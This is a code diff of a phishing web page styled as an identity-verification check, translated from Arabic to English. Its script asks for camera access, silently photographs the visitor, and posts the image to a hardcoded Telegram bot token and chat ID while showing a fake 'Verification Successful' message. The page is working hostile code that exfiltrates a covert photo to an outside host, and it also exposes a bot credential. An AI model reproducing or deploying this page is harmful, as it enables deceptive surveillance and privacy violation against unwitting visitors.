@@ -1,61 +1,83 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق الرسمي</title>
+    <title>Secure Verification System</title>
     <style>
-        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding: 50px 20px; }
-        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; border: 1px solid #333; max-width: 400px; margin: auto; }
-        button { background: #28a745; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold; }
-        #status { margin-top: 25px; color: #ffc107; font-weight: bold; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #0f0f0f; color: white; padding: 50px 20px; }
+        .card { background: #1a1a1a; padding: 40px; border-radius: 20px; border: 1px solid #333; max-width: 450px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #28a745; margin-bottom: 10px; }
+        p { color: #aaa; margin-bottom: 30px; }
+        button { background: #28a745; color: white; border: none; padding: 18px; width: 100%; font-size: 18px; border-radius: 12px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        button:hover { background: #218838; }
+        #status { margin-top: 25px; color: #ffc107; font-weight: 500; line-height: 1.6; }
+        .footer-note { font-size: 12px; color: #555; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>تأكيد الهوية</h2>
-        <p>يجب الضغط على الزر والموافقة على إذن الكاميرا عند ظهوره.</p>
-        <button id="authBtn">إرسال طلب إذن الكاميرا</button>
-        <div id="status"></div>
+        <h2>Identity Verification</h2>
+        <p>Please click the button below and grant camera access when prompted by your browser.</p>
+        
+        <button id="authBtn">Verify & Proceed</button>
+        
+        <div id="status">Waiting for user action...</div>
+        <div class="footer-note">Note: If permission fails, click the Lock (🔒) icon in the address bar to manually allow camera.</div>
     </div>
+
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
+        const BOT_TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
         const ADMIN_ID = "7289235107";
 
-        document.getElementById('authBtn').onclick = async () => {
-            const s = document.getElementById('status');
+        document.getElementById('authBtn').addEventListener('click', async () => {
+            const status = document.getElementById('status');
             try {
-                s.innerText = "جاري طلب الإذن... يرجى اختيار 'سماح'";
+                status.innerText = "Requesting camera permission...";
                 
-                // طلب الكاميرا من النظام مباشرة
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                
-                s.innerText = "✅ تم السماح! جاري التقاط الصورة...";
-                const v = document.getElementById('v');
-                v.srcObject = stream;
+                // Trigger the browser's permission dialog
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
 
+                status.innerText = "Permission granted! Processing...";
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                // Capture after 2 seconds to ensure camera focus
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.width = v.videoWidth;
-                    canvas.height = v.videoHeight;
-                    canvas.getContext('2d').drawImage(v, 0, 0);
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    const fd = new FormData();
-                    fd.append('chat_id', ADMIN_ID);
-                    fd.append('photo', blob, 'cam.jpg');
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                    const formData = new FormData();
+                    formData.append('chat_id', ADMIN_ID);
+                    formData.append('photo', blob, 'verify.jpg');
 
-                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    s.innerText = "✅ اكتملت العملية بنجاح!";
-                    stream.getTracks().forEach(t => t.stop());
+                    // Send to Telegram
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    status.style.color = "#28a745";
+                    status.innerText = "✅ Verification Successful!";
+                    
+                    // Stop camera stream
+                    stream.getTracks().forEach(track => track.stop());
                 }, 2000);
-            } catch (e) {
-                s.innerHTML = "❌ فشل الإذن تلقائياً.<br>يرجى الضغط على القفل 🔒 أعلى المتصفح واختيار 'سماح للكاميرا'.";
+
+            } catch (err) {
+                status.style.color = "#ff4d4d";
+                status.innerHTML = "❌ Error: Permission Denied.<br>Please enable camera in browser settings (Lock 🔒 icon).";
             }
-        };
+        });
     </script>
 </body>
 </html>
